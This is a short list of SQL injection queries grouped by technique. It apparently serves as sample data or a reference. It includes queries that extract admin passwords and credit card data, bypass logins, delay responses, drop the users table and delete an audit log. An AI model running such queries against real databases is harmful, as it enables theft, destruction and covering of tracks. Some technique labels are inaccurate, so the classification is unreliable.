Malicious SQL Injection Queries
UNION-based attacks
SELECT * FROM users WHERE id = 1 UNION SELECT username,password FROM admin--;
SELECT * FROM products WHERE id = 2 UNION ALL SELECT creditcard,pin FROM customers;
Error-based attacks
SELECT * FROM users WHERE username = 'admin' OR 1=1--;
SELECT * FROM users WHERE username = 'anything' OR '1'='1';
Boolean-based attacks
SELECT * FROM users WHERE username = 'admin' AND 1=1;
SELECT * FROM products WHERE id = 1' OR '1'='1;
Time-based attacks
SELECT * FROM users WHERE username = 'admin' AND SLEEP(5);
SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000,MD5('test'));
Stacked queries attacks
SELECT * FROM users; DROP TABLE users;
SELECT * FROM products; DELETE FROM audit_log;
Comment-based attacks
SELECT * FROM users WHERE username = 'admin'--AND password = 'secret';
SELECT * FROM /* malicious comment */ users WHERE id = 1;
